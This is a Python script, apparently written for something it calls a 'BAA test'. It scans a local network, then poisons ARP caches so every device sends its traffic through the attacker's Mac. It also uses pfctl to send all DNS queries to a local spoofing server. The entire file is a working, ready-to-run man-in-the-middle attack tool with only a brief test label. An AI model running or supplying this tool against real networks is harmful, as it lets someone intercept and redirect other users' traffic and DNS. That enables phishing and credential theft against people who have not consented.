#!/usr/bin/env python3
"""
ARP spoof + DNS redirect for BAA test.

Spoofs the gateway so all devices on the LAN send traffic through this Mac.
Enables IP forwarding and uses pfctl to redirect port 53 (DNS) to our local
dns_spoof server. All other traffic is forwarded normally.

Usage:
    sudo python3 arp_redirect.py [--gateway 192.0.2.254] [--iface en0]
"""

import os
import sys
import time
import signal
import subprocess
import logging
import argparse
import threading

from scapy.all import (
    ARP, Ether, sendp, getmacbyip, get_if_hwaddr, conf, srp
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | arp | %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("arp")

# Global state for cleanup
_original_forwarding = None
_pf_anchor_active = False
_gateway_ip = None
_gateway_mac = None
_iface = None


def enable_forwarding():
    """Enable IP forwarding on macOS."""
    global _original_forwarding
    result = subprocess.run(
        ["sysctl", "-n", "net.inet.ip.forwarding"],
        capture_output=True, text=True
    )
    _original_forwarding = result.stdout.strip()
    subprocess.run(
        ["sysctl", "-w", "net.inet.ip.forwarding=1"],
        capture_output=True
    )
    logger.info("IP forwarding enabled (was: %s)", _original_forwarding)


def setup_pf_redirect():
    """Set up pfctl to redirect DNS (port 53) to local server."""
    global _pf_anchor_active

    # Write pf rules to redirect DNS traffic from LAN to our server
    rules = (
        "rdr on en0 proto udp from any to any port 53 -> 127.0.0.1 port 53\n"
        "rdr on en0 proto tcp from any to any port 53 -> 127.0.0.1 port 53\n"
    )
    rules_file = "/tmp/baa_pf_rules.conf"
    with open(rules_file, "w") as f:
        f.write(rules)

    # Load the rules
    subprocess.run(["pfctl", "-f", rules_file, "-e"], capture_output=True)
    _pf_anchor_active = True
    logger.info("pfctl DNS redirect active (port 53 -> local)")


def disable_pf_redirect():
    """Remove pfctl redirect rules."""
    global _pf_anchor_active
    if _pf_anchor_active:
        subprocess.run(["pfctl", "-d"], capture_output=True)
        _pf_anchor_active = False
        logger.info("pfctl disabled")


def restore_forwarding():
    """Restore original IP forwarding state."""
    if _original_forwarding is not None:
        subprocess.run(
            ["sysctl", "-w", f"net.inet.ip.forwarding={_original_forwarding}"],
            capture_output=True
        )
        logger.info("IP forwarding restored to %s", _original_forwarding)


def restore_arp(gateway_ip, gateway_mac, iface):
    """Send correct ARP to restore network."""
    if gateway_mac:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
            pdst="255.255.255.255",
            hwdst="ff:ff:ff:ff:ff:ff",
        )
        sendp(pkt, iface=iface, count=5, inter=0.2, verbose=False)
        logger.info("ARP restored for gateway %s", gateway_ip)


def scan_network(gateway_ip, iface):
    """Scan the local /24 subnet to find active hosts."""
    subnet = ".".join(gateway_ip.split(".")[:3]) + ".0/24"
    logger.info("Scanning %s for active hosts...", subnet)
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
        timeout=3, iface=iface, verbose=False
    )
    hosts = []
    for _, rcv in ans:
        hosts.append((rcv[ARP].psrc, rcv[Ether].src))
        logger.info("  Found: %s (%s)", rcv[ARP].psrc, rcv[Ether].src)
    return hosts


def arp_spoof_loop(gateway_ip, gateway_mac, my_mac, iface, targets=None):
    """
    Continuously spoof ARP:
    - Tell all hosts (or specific targets) that we are the gateway.
    - Tell the gateway that we are each target.
    """
    # Build gateway spoof packet (broadcast: tell everyone we are the gateway)
    gw_spoof = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=my_mac,
        pdst="255.255.255.255",
        hwdst="ff:ff:ff:ff:ff:ff",
    )

    logger.info("ARP spoofing started (gateway %s)", gateway_ip)
    while True:
        try:
            # Tell everyone we are the gateway
            sendp(gw_spoof, iface=iface, verbose=False)

            # If we know specific targets, also tell the gateway we are them
            if targets:
                for target_ip, target_mac in targets:
                    rev_spoof = Ether(dst=gateway_mac) / ARP(
                        op=2,
                        psrc=target_ip,
                        hwsrc=my_mac,
                        pdst=gateway_ip,
                        hwdst=gateway_mac,
                    )
                    sendp(rev_spoof, iface=iface, verbose=False)

            time.sleep(2)
        except Exception as e:
            logger.error("ARP spoof error: %s", e)
            time.sleep(5)


def cleanup(signum=None, frame=None):
    """Clean up on exit."""
    logger.info("Cleaning up...")
    disable_pf_redirect()
    restore_forwarding()
    if _gateway_ip and _gateway_mac and _iface:
        restore_arp(_gateway_ip, _gateway_mac, _iface)
    logger.info("Cleanup done.")
    sys.exit(0)


def main():
    global _gateway_ip, _gateway_mac, _iface

    parser = argparse.ArgumentParser(description="ARP redirect for BAA test")
    parser.add_argument("--gateway", default="192.0.2.254",
                        help="Gateway IP")
    parser.add_argument("--iface", default="en0",
                        help="Network interface")
    args = parser.parse_args()

    _gateway_ip = args.gateway
    _iface = args.iface

    # Get MACs
    my_mac = get_if_hwaddr(_iface)
    _gateway_mac = getmacbyip(_gateway_ip)

    if not _gateway_mac:
        logger.error("Cannot resolve gateway MAC for %s", _gateway_ip)
        sys.exit(1)

    logger.info("Gateway: %s (%s)", _gateway_ip, _gateway_mac)
    logger.info("Our MAC: %s", my_mac)

    # Set up signal handlers
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # Scan for active hosts
    hosts = scan_network(_gateway_ip, _iface)

    # Enable IP forwarding
    enable_forwarding()

    # Set up pfctl DNS redirect
    setup_pf_redirect()

    print()
    print("=" * 60)
    print("  ARP Redirect Active")
    print("=" * 60)
    print(f"  Gateway:  {_gateway_ip} ({_gateway_mac})")
    print(f"  Our MAC:  {my_mac}")
    print(f"  Hosts:    {len(hosts)} found on LAN")
    print(f"  DNS:      All port 53 -> local dns_spoof")
    print()
    print("  All devices on this network will use our DNS.")
    print("  Press Ctrl+C to stop and restore network.")
    print("=" * 60)
    print()

    # Start ARP spoofing in foreground
    arp_spoof_loop(
        _gateway_ip, _gateway_mac, my_mac, _iface,
        targets=[(ip, mac) for ip, mac in hosts
                 if ip != args.gateway and mac != my_mac]
    )


if __name__ == "__main__":
    main()
